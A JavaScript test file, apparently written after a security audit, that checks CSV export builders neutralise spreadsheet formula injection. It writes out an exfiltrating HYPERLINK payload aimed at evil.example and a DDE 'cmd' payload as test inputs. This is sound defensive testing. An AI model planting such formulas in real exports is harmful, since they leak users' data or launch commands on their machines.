// CSV formula injection, client half (security audit 2026-10-26, L5-02/L7-14).
// Every client CSV builder goes through the one guarded cell in csvExport.js.
import { describe, expect, it } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { csvEscape, neutraliseFormula, buildCsv } from './csvExport.js';
import { buildRecordsCsv, csvCell as oyonCsvCell } from '../oyon/emotionLogShared.js';
import { toCSV } from './tna/laila/exports.js';

const here = path.dirname(fileURLToPath(import.meta.url));
const src = (rel) => fs.readFileSync(path.resolve(here, '..', rel), 'utf8');

const PAYLOAD = '=HYPERLINK("https://evil.example/?d="&B2,"details")';

describe('the guarded cell', () => {
    it.each(['=1+1', '+1+1', '-2+3+cmd|\' /C calc\'!A0', '@SUM(A1)', '\tx', '\rx'])('neutralises %j', (v) => {
        expect(neutraliseFormula(v).startsWith("'")).toBe(true);
    });

    it('keeps plain numbers numeric, including negatives', () => {
        for (const v of ['-0.42', '-3', '+1.5', '1e-3', '-2.5E+4', '.5']) expect(neutraliseFormula(v)).toBe(v);
        expect(csvEscape(-0.42)).toBe('-0.42');
        expect(csvEscape(0)).toBe('0');
    });

    it('quotes after guarding', () => {
        expect(csvEscape(PAYLOAD)).toBe(`"'=HYPERLINK(""https://evil.example/?d=""&B2,""details"")"`);
        expect(buildCsv([{ a: '=x', b: 'ok' }], ['a', 'b'])).toBe("a,b\r\n'=x,ok");
    });
});

describe('every builder uses it', () => {
    // Regression lock: student_name_snapshot (client-supplied) reached the Oyon export unguarded.
    it('Oyon emotion-record export', () => {
        const csv = buildRecordsCsv([{ window_start: 'a', window_end: 'b', session_id: 1, student_name_snapshot: PAYLOAD }]);
        expect(csv).toContain(`"'=HYPERLINK(`);
        expect(csv).not.toMatch(/(^|,)"?=HYPERLINK/m);
        expect(oyonCsvCell).toBe(csvEscape);
    });

    // Regression lock: the vendored TNA (laila) CSV had no formula guard.
    it('TNA (laila) export', () => {
        const csv = toCSV([{ from: '@cmd', to: '-0.5' }], [{ key: 'from', header: 'From' }, { key: 'to', header: 'To' }]);
        expect(csv).toBe("From,To\r\n'@cmd,-0.5");
    });

    it.each([
        'oyon/OyonAttentionV2.jsx',
        'oyon/OyonAttentionView.jsx',
        'settings/users/BulkOperationsModal.jsx',
        'settings/users/UserImportWizard.jsx',
    ])('%s has no private unguarded escaper left', (rel) => {
        const text = src(rel);
        expect(text).toMatch(/import \{ csvEscape \} from '\.\.\/(\.\.\/)?analytics\/csvExport'/);
        expect(text).not.toMatch(/replace\(\/"\/g, '""'\)|replaceAll\('"', '""'\)/);
    });
});
